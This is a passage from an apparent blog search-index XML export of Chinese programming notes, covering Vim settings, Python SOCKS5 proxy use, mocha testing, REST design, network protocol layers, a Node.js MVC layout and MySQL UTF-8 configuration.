class="line"><span class="keyword">set</span> autoindent</span><br><span class="line"><span class="keyword">set</span> softtabstop=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">number</span> <span class="string">&quot;show line number&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 配置 </category>
          
          <category> Vim配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python：使用代理的相关问题</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%EF%BC%9A%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%EF%BC%9A%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>socks request 使用和不使用代理  模块代理</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>You could set the socket back to socket.socket when you don’t want to use a proxy.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import<span class="built_in"> socks</span></span><br><span class="line"><span class="built_in"></span>import socket</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">_socket = socket.socket</span><br><span class="line">socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, <span class="string">&quot;61.8.75.186&quot;</span>, 1080)</span><br><span class="line"></span><br><span class="line"><span class="comment"># With Socks5</span></span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line">url = <span class="string">&#x27;http://ip.3300.ir/&#x27;</span></span><br><span class="line">response = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=10)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;Set ip: &#123;&#125;&quot;</span>.format(response.content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Without Socks5</span></span><br><span class="line">socket.socket = _socket</span><br><span class="line">url = <span class="string">&#x27;http://ip.3300.ir/&#x27;</span></span><br><span class="line">response = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=10)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;Set ip: &#123;&#125;&quot;</span>.format(response.content))</span><br></pre></td></tr></table></figure><span id="more"></span><p>If you’re using requests &gt; 2.10.0 you can set a SOCKS proxy in the proxies parameter.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># With Socks5</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;socks5://61.8.75.186:1080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;socks5://61.8.75.186:1080&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;http://ip.3300.ir/&#x27;</span></span><br><span class="line">response = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=10, <span class="attribute">proxies</span>=proxies)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;Set ip: &#123;&#125;&quot;</span>.format(response.content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Without Socks5</span></span><br><span class="line">url = <span class="string">&#x27;http://ip.3300.ir/&#x27;</span></span><br><span class="line">response = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=10)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;Set ip: &#123;&#125;&quot;</span>.format(response.content))</span><br></pre></td></tr></table></figure></br>### 局部  模块代理<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks.set<span class="constructor">_default_proxy(<span class="params">socks</span>.PROXY_TYPE_SOCKS5,<span class="params">proxyhost</span>,<span class="params">int</span>(<span class="params">proxyip</span>)</span>)</span><br><span class="line">socks.wrapmodule(smtplib)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4，JavaScript-Web开发-mocha(测试)</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/4%EF%BC%8Cjavascript-web%E5%BC%80%E5%8F%91-mocha-%E6%B5%8B%E8%AF%95/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/4%EF%BC%8Cjavascript-web%E5%BC%80%E5%8F%91-mocha-%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h5 id="测试驱动开发-TDD"><a href="#测试驱动开发-TDD" class="headerlink" title="测试驱动开发 TDD"></a>测试驱动开发 TDD</h5><p>Test-Driven Development</p><p>测试用例放在测试模块里，完成<strong>单元测试</strong>。</p><p>以测试为驱动的开发模式：确保一个程序模块的行为<strong>符合设计</strong>的测试用例。</p><p>mocha:JavaScript 的一种单元测试框架，特点：</p><ul><li>测试简单JavaScript函数 &amp;&amp; 异步代码</li><li>自动运行所有测试 || 只运行特定测试</li><li>支持before,after,beforeEach和afterEach来编写初始代码<span id="more"></span><h5 id="mocha-test-工程结构"><a href="#mocha-test-工程结构" class="headerlink" title="mocha test 工程结构"></a>mocha test 工程结构</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hello-test\</span><br><span class="line"><span class="string">|</span></span><br><span class="line">+-  .vscode/</span><br><span class="line"><span class="string">|   |</span></span><br><span class="line"><span class="string">|   +-  lanuch.json</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line">+-  hello.js       &lt;-- 待测试模块</span><br><span class="line"><span class="string">|</span></span><br><span class="line">+-  test/          &lt;-- 存放所有test</span><br><span class="line"><span class="string">|   |</span></span><br><span class="line"><span class="string">|   +-  hello-test.js  &lt;-- 测试模块</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line">+-  package.json    &lt;-- 项目描述文件</span><br><span class="line"><span class="string">|</span></span><br><span class="line">+-  node_modules/   &lt;-- npm安装的所有依赖包</span><br></pre></td></tr></table></figure><h5 id="安装mocha"><a href="#安装mocha" class="headerlink" title="安装mocha"></a>安装mocha</h5> 项目描述文件添加 <code>&quot;devDependencies&quot;:&#123;&quot;mocha&quot;:&quot;3.0.2&quot;&#125;</code><ul><li>npm install  通过项目描述文件添加依赖包</li><li>npm install -g mocha  不推荐，尽量不要安装全局模块(会影响所有的Node.js工程)</li></ul></li></ul><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const assert = require(&#x27;assert&#x27;)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">const sum = require(&#x27;../hello&#x27;)<span class="comment">;</span></span><br><span class="line">describe(&#x27;#hello.js&#x27;, () =&gt; &#123;</span><br><span class="line">    describe(&#x27;#sum()&#x27;, () =&gt; &#123;</span><br><span class="line">        it(&#x27;sum() should return <span class="number">0</span>&#x27;, () =&gt; &#123;</span><br><span class="line">            assert.strictEqual(<span class="name">sum</span>(), <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">        &#125;)<span class="comment">;</span></span><br><span class="line">        it(&#x27;sum(<span class="number">1</span>) should return <span class="number">1</span>&#x27;, () =&gt; &#123;</span><br><span class="line">            assert.strictEqual(<span class="name">sum</span>(<span class="number">1</span>), <span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">        &#125;)<span class="comment">;</span></span><br><span class="line">        it(&#x27;sum(<span class="number">1</span>, <span class="number">2</span>) should return <span class="number">3</span>&#x27;, () =&gt; &#123;</span><br><span class="line">            assert.strictEqual(<span class="name">sum</span>(<span class="number">1</span>, <span class="number">2</span>), <span class="number">3</span>)<span class="comment">;</span></span><br><span class="line">        &#125;)<span class="comment">;</span></span><br><span class="line">        it(&#x27;sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) should return <span class="number">6</span>&#x27;, () =&gt; &#123;</span><br><span class="line">            assert.strictEqual(<span class="name">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="number">6</span>)<span class="comment">;</span></span><br><span class="line">        &#125;)<span class="comment">;</span></span><br><span class="line">    &#125;)<span class="comment">;</span></span><br><span class="line">&#125;)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><code>describe</code>可任意嵌套，看成一组测试 </br><br><code>it(&quot;name&quot;,function()&#123;...&#125;</code>   代表一个测试</p><h5 id="运行测试-必须是test文件夹"><a href="#运行测试-必须是test文件夹" class="headerlink" title="运行测试(必须是test文件夹?!)"></a>运行测试(必须是test文件夹?!)</h5><ul><li>node node_module/../mocha  寻找test文件夹下的模块测试</li><li><code>package.json</code>添加npm命令<ul><li><code>&quot;scripts&quot;:&#123;&quot;test&quot;:&quot;mocha&quot;&#125;</code></li><li>工程目录下执行<code>npm test</code></li></ul></li><li>创建配置文件<code>.vscode/launch.json</code><ul><li>添加Test配置选项</li><li><pre><code class="&#123;">        &quot;name&quot;: &quot;test&quot;,        &quot;type&quot;: &quot;node&quot;,        &quot;request&quot;: &quot;launch&quot;,        &quot;program&quot;: &quot;$&#123;workspaceRoot&#125;/node_modules/mocha/bin/mocha&quot;,        &quot;env&quot;: &#123;            &quot;NODE_ENV&quot;:&quot;test&quot;        &#125;    &#125;</code></pre></li></ul></li></ul><h5 id="before-和-after"><a href="#before-和-after" class="headerlink" title="before 和 after"></a>before 和 after</h5><p>测试前初始化资源 测试后释放资源</p><ul><li>before</li><li>after</li><li>beforeEach</li><li>afterEach</li></ul><p>每一组test执行前后会分别执行before()和after()<br></br>　　每一个testh执行前后会分别执行beforeEach()和afterEach()</p>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5, JavaScript-Web开发-REST</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/5-javascript-web%E5%BC%80%E5%8F%91-rest/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/5-javascript-web%E5%BC%80%E5%8F%91-rest/</url>
      
        <content type="html"><![CDATA[<h5 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h5><p>(Representational State Transfer)  软件架构模式</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">graph</span> <span class="selector-tag">LR</span></span><br><span class="line"><span class="selector-tag">A</span>&#123;<span class="selector-tag">HTML</span>页面&#125;<span class="selector-tag">--</span>&gt;<span class="selector-tag">B1</span><span class="selector-attr">[Product的数据]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B2</span><span class="selector-attr">[Product的展示]</span></span><br><span class="line"><span class="selector-tag">B1--</span>&gt;<span class="selector-tag">C</span>(编写web api直接返回数据)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>REST  设计API的模式</n><br>编写API的好处:</p><ul><li>前后端分离，使后端更易于测试，前端易于编写</li><li>前端用于展示，API提供数据(不同客户端时，只需更改前端展示)<span id="more"></span>  <h5 id="REST规范"><a href="#REST规范" class="headerlink" title="REST规范"></a>REST规范</h5></li><li>REST请求是HTTP请求，除GET请求外，POST、PUT等请求：<ul><li>请求的body是json数据格式</li><li>请求的<code>Content-Type</code>为<code>application/json</code></li></ul></li><li>REST响应<ul><li>响应返回的结果是json数据格式</li><li>响应的<code>Content-Type</code>为<code>application/json</code></li></ul></li></ul><h5 id="REST举例"><a href="#REST举例" class="headerlink" title="REST举例"></a>REST举例</h5><p>例如，商品Product就是一种资源？？？</p><ul><li><strong>获取</strong>所有Product的URL </br><br><code>GET /api/products</code></li><li><strong>获取</strong>一个指定Product(id为<code>123</code>) </br><br><code>GET /api/products/123</code></li><li><strong>新建</strong>一个Product(使用POST请求，json数据在body中)</br><br><code>POST /api/products</code></li><li><strong>更新</strong>一个Product(使用PUT请求，更新id为<code>123</code>)</br><br><code>PUT /api/products/123</code></li><li><strong>删</strong>除一个Product(使用DELETE请求，删除id为<code>123</code>)</br><br><code>DELETE /api/products/123</code></li><li><strong>获取评论</strong>(资源按层次组织) </br><br><code>GET /api/products/123/reviews</code></li><li>参数限制返回的结果集(返回第二页评论，每页10项，按时间排序)</br><br><code>GET /api/products/123/reviews?page=2&amp;size=10&amp;sort=time</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 廖雪峰教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1, 网络协议概述</title>
      <link href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"/>
      <url>/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h5 id="协议三要素："><a href="#协议三要素：" class="headerlink" title="协议三要素："></a>协议三要素：</h5><p>协议是什么，是条款，规则，约定,</br>是约定我要按照特定<strong>格式</strong>和<strong>顺序</strong>给你，这样你在接收的时候才能使用一定规则解析</p><ul><li><em>语法</em><ul><li>规则和格式</li></ul></li><li><em>语义</em></li><li><em>顺序</em></li></ul><h5 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h5><p>DNS/HTTPDNS: 地址簿协议</br><br>应用层：DNS,HTTP,HTTPS所在的层</p><p></br>应用层(HTTP)–&gt;<em>会话层(TLS)</em>–&gt;传输层(TCP)–&gt;网络层(IP)–&gt;链路层–&gt;物理层</p><span id="more"></span><h5 id="请求实例讲解"><a href="#请求实例讲解" class="headerlink" title="请求实例讲解"></a>请求实例讲解</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[输入URL] --&gt;|<span class="type">DNS</span>查找|<span class="type">B</span>[IP]</span><br><span class="line">    B--&gt;|<span class="type">使用HTTP</span>/HTTPS协议打包请求&lt;应用层&gt;|<span class="type">C</span>[应用层封装后的包]</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>输入<code>url</code></p></li><li><p>使用地址簿协议<code>dns/httpdns</code>获取对应<code>ip</code></p></li><li><p><strong>应用层</strong>封装(浏览器打包请求)</p><ul><li>使用<code>http</code>协议或<code>https</code>协议   </li><li><code>DNS、HTTP、HTTPS</code>所在的层是应用层</li></ul><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lkeqmr9j30b903qglk.jpg" alt="image"></li><li><p><strong>传输层</strong>封装</p><ul><li>无连接的UDP协议</li><li>面向连接的TCP协议(重复发送直至到达)</li><li>TCP协议会有两个端口(浏览器监听的端口和服务器监听的端口)(端口==&gt;进程)</li></ul><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1jbwyj30av04eq30.jpg" alt="image"></li><li><p><strong>网络层</strong>封装</p><ul><li>ip协议</li><li>协议里会有源<code>ip</code>地址(浏览器所在机器的<code>IP</code>地址和目标<code>IP</code>地址)</li></ul><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1jfvgj30ax05pjrm.jpg" alt="image"></li><li><p><strong>MAC层</strong></p><ul><li>判断目标IP在本地还是外地(比喻，从门牌号可以判断)</li><li>去外地要通过网关<ul><li><em>(操作系统启动时，会被<code>DHCP协议</code>配置IP地址，以及网关的IP地址)</em></li></ul></li><li>把<code>IP地址</code>发给网关<ul><li>操作系统通过<code>ARP协议</code></li><li>网关响应，返回<code>MAC地址</code></li><li>操作系统把<code>IP包</code>交给<code>MAC层</code>(网卡)</li><li>网卡再将包发给网关(此时包里有网关的<code>MAC地址</code></li></ul></li></ul><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1ky8wj30an06iaah.jpg" alt="image"></li><li><p>路由协议(OSPF和BGP等)</p><ul><li>网关一般是一个路由器</li><li>路由表</li><li>IP 头</li><li>网关连接着两个局域网(城关连接这两个城市,跨越城市需要拿IP头)</li><li>需要拿IP头  源IP地址，目标IP地址</li></ul></li></ul><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1jtu4j30i003vdg4.jpg" alt="image"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1m6ixj30jd0bq0tf.jpg" alt="image"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1kk1xj30k20eat9z.jpg" alt="image"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g04lp1ljpzj30eg08a0uu.jpg" alt="image">]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1, JavaScript-Web开发-MVC结构</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/1-javascript-web%E5%BC%80%E5%8F%91-mvc%E7%BB%93%E6%9E%84/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/1-javascript-web%E5%BC%80%E5%8F%91-mvc%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Project_koa</span><br><span class="line">|<span class="string"></span></span><br><span class="line"><span class="string">+-  .vscode/   --------------     VSCode配置文件</span></span><br><span class="line"><span class="string"></span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">   +-  lauch.json</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  controllers/  -------------   处理URL</span><br><span class="line">|<span class="string">   </span>|</span><br><span class="line">|<span class="string">   +-  *.js  login.js  index.js   处理URL的函数</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  app.js       --------------    入口js , 运行主程序</span><br><span class="line">|<span class="string"></span></span><br><span class="line"><span class="string">+-  package.json   ------------    项目描述文件(添加node依赖包)</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  node_modules/  ------------    npm安装的所有依赖包()</span><br></pre></td></tr></table></figure><span id="more"></span><p><a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434501628911140e1cb6ce7d42e5af81480f7ecd5802000">廖雪峰Node.js-使用MVC</a></br><br>MVC:Model-View-Controller<br></br>　　　模型　-　视图　-　控制器</p><ul><li>Controller:负责业务逻辑（比如:检查用户名是否存在，取出用户信息等）</li><li>View:简单替换一些变量输出用户看到的HTML</li><li>Model:传给View的数据<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Project_MVC()</span><br><span class="line">|<span class="string"></span></span><br><span class="line"><span class="string">+-  .vscode/      --------------     VSCode配置文件()</span></span><br><span class="line"><span class="string"></span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">   +-  lauch.json</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  controllers/  -------------    处理URL()</span><br><span class="line">|<span class="string">   </span>|</span><br><span class="line">|<span class="string">   +-  *.js  login.js  index.js   处理URL的函数</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  controller.js -------------    扫描注册Controllers文件夹下的函数()</span><br><span class="line">|<span class="string"></span></span><br><span class="line"><span class="string">+-  views/        -------------    html模板文件()</span></span><br><span class="line"><span class="string"></span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">   +-  *.html  base.html index.html  signin-failed.html signin-ok.html</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  app.js       --------------    入口js , 运行主程序()</span><br><span class="line">|<span class="string"></span></span><br><span class="line"><span class="string">+-  static/       -------------    静态资源文件(bootstrap)</span></span><br><span class="line"><span class="string"></span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">   +-  css/      bootstrap.css</span></span><br><span class="line"><span class="string"></span>|<span class="string">   +-  js/       bootstrap.js</span></span><br><span class="line"><span class="string"></span>|<span class="string">   +-  fonts/    字体文件</span></span><br><span class="line"><span class="string"></span>|</span><br><span class="line">+-  package.json   ------------    项目描述文件(添加node依赖包)</span><br><span class="line">|<span class="string"></span></span><br><span class="line"><span class="string">+-  node_modules/  ------------    npm安装的所有依赖包()</span></span><br><span class="line"><span class="string">  </span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> MVC </tag>
            
            <tag> 廖雪峰教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2, JavaScript-Web开发-mysql</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/2-javascript-web%E5%BC%80%E5%8F%91-mysql/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/2-javascript-web%E5%BC%80%E5%8F%91-mysql/</url>
      
        <content type="html"><![CDATA[<h3 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h3><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul><li>程序终止时，都需要将数据保存到磁盘</li><li>存储和读取自己实现时,  <ul><li>自定义格式多种多样</li><li>只有把数据全部读到内存中才能遍历？<ul><li>不能做快速查询</li><li>数据的大小不能超过内存</li></ul></li></ul></li></ul><h4 id="数据库的出现"><a href="#数据库的出现" class="headerlink" title="数据库的出现"></a>数据库的出现</h4><p>便于程序<strong>保存</strong>，<strong>读取</strong>，<strong>数据</strong>。</p><span id="more"></span><h4 id="数据库的类别"><a href="#数据库的类别" class="headerlink" title="数据库的类别"></a>数据库的类别</h4><ul><li>付费的商用数据库<ul><li>Oracle，典型的高富帅</li><li>SQL Server，微软自家产品，Windows定制专款</li><li>DB2，IBM的产品，听起来挺高端</li><li>Sybase，曾经跟微软是好基友，后来关系破裂，现在家境惨淡</li></ul></li><li>免费的开源数据库<ul><li>MySQL，大家都在用，一般错不了；</li><li>PostgreSQL，学术气息有点重，其实挺不错，但知名度没有MySQL高；</li><li>sqlite，嵌入式数据库，适合桌面和移动应用。</li></ul></li></ul><h4 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h4><h5 id="下载并安装MySQL-Community-Server-5-6"><a href="#下载并安装MySQL-Community-Server-5-6" class="headerlink" title="下载并安装MySQL Community Server 5.6"></a>下载并安装<a href="https://dev.mysql.com/downloads/mysql/">MySQL Community Server 5.6</a></h5><h5 id="安装时的注意事项"><a href="#安装时的注意事项" class="headerlink" title="安装时的注意事项"></a>安装时的注意事项</h5><ul><li>root password</li><li>编码改为<em>utf-8</em> (为了正确处理中文)<ul><li>windows  安装时选择UTF-8</li><li>Mac或Linux  编辑MySQL的配置文件<ul><li>默认编码全部改为UTF-8</li><li>如果MySQL的版本≥5.5.3,可设置编码为<strong>utf8mb4</strong> (兼容utf8；支持最新的Unicode标准，可显示emoji字符)</li><li>配置文件位置 /etc/my.cnf     /etc/mysql/my.cnf  :<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[client]</span></span><br><span class="line"><span class="attr">default-character-set</span> = utf8</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">default-storage-engine</span> = INNODB</span><br><span class="line"><span class="attr">character-set-server</span> = utf8</span><br><span class="line"><span class="attr">collation-server</span> = utf8_general_ci</span><br></pre></td></tr></table></figure>重启MySQL后，通过MySQL的客户端命令行检查编码<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#x27;%char%&#x27;;</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">|<span class="string"> Variable_name            </span>|<span class="string"> Value                                                  </span>|</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">|<span class="string"> character_set_client     </span>|<span class="string"> utf8                                                   </span>|</span><br><span class="line">|<span class="string"> character_set_connection </span>|<span class="string"> utf8                                                   </span>|</span><br><span class="line">|<span class="string"> character_set_database   </span>|<span class="string"> utf8                                                   </span>|</span><br><span class="line">|<span class="string"> character_set_filesystem </span>|<span class="string"> binary                                                 </span>|</span><br><span class="line">|<span class="string"> character_set_results    </span>|<span class="string"> utf8                                                   </span>|</span><br><span class="line">|<span class="string"> character_set_server     </span>|<span class="string"> utf8                                                   </span>|</span><br><span class="line">|<span class="string"> character_set_system     </span>|<span class="string"> utf8                                                   </span>|</span><br><span class="line">|<span class="string"> character_sets_dir       </span>|<span class="string"> /usr/local/mysql-5.1.65-osx10.6-x86_64/share/charsets/ </span>|</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 廖雪峰教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3, JavaScript-Web开发-mysql--使用Sequelize</title>
